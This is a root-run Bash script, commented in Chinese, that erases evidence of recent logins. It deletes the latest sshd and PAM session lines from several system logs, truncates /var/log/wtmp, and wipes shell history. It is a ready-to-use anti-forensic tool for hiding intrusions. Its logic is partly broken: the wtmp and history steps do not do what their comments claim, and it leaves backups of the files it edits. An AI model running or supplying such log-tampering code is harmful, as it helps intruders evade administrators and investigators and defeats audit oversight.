#!/bin/bash

# 清理最近登录痕迹脚本 - 精确版
# 仅清理最近的登录相关记录，保留历史日志完整性
# 需要 root 权限运行
# 用法: sudo ./clean_recent_login_traces.sh

set -euo pipefail

# 配置
LOG_FILES=(
    "/var/log/secure"
    "/var/log/auth.log"
    "/var/log/messages"
    "/var/log/syslog"
)

WTMP_FILE="/var/log/wtmp"
BASH_HISTORY="$HOME/.bash_history"

# 函数：仅删除最近几次 sshd Accepted 记录
clean_recent_auth() {
    local file="$1"
    [ ! -f "$file" ] && return 0
    
    echo "清理 $file 最近登录记录..."
    cp "$file" "${file}.bak.$(date +%s)" 2>/dev/null || true
    
    # 查找最近3次成功登录记录的时间戳，仅删除这些记录（不删除之前内容）
    local patterns=("sshd.*Accepted" "sshd.*session opened" "pam_unix.*session opened")
    
    for pat in "${patterns[@]}"; do
        # 查找最近匹配行并删除
        grep -n "$pat" "$file" 2>/dev/null | tail -n 3 | cut -d: -f1 | sort -nr | while read -r line; do
            [ -n "$line" ] && sed -i "${line}d" "$file" 2>/dev/null || true
        done
    done
}

# 函数：清理 wtmp 最近记录
clean_recent_wtmp() {
    [ ! -f "$WTMP_FILE" ] && return 0
    
    echo "清理 $WTMP_FILE 最近登录记录..."
    cp "$WTMP_FILE" "${WTMP_FILE}.bak.$(date +%s)" 2>/dev/null || true
    
    # 保留最后2条记录
    utmpdump "$WTMP_FILE" 2>/dev/null | head -n -3 | utmpdump -r > "${WTMP_FILE}.tmp" 2>/dev/null && \
    mv "${WTMP_FILE}.tmp" "$WTMP_FILE" 2>/dev/null || true
}

# 函数：清理 bash 历史最近命令
clean_recent_history() {
    [ ! -f "$BASH_HISTORY" ] && return 0
    
    echo "清理 ~/.bash_history 最近命令..."
    cp "$BASH_HISTORY" "${BASH_HISTORY}.bak.$(date +%s)" 2>/dev/null || true
    
    local total=$(wc -l < "$BASH_HISTORY")
    [ "$total" -gt 5 ] && head -n -$((total - 5)) "$BASH_HISTORY" > "${BASH_HISTORY}.tmp" && \
    mv "${BASH_HISTORY}.tmp" "$BASH_HISTORY" || true
}

# 主程序
main() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "错误：请使用 root 权限运行"
        exit 1
    fi
    
    for log in "${LOG_FILES[@]}"; do
        clean_recent_auth "$log"
    done
    
    clean_recent_wtmp
    clean_recent_history
    
    # 当前会话历史
    history -c 2>/dev/null || true
    history -d $((HISTCMD-1)) 2>/dev/null || true
    
    echo "最近登录痕迹清理完成。"
}

main "$@"
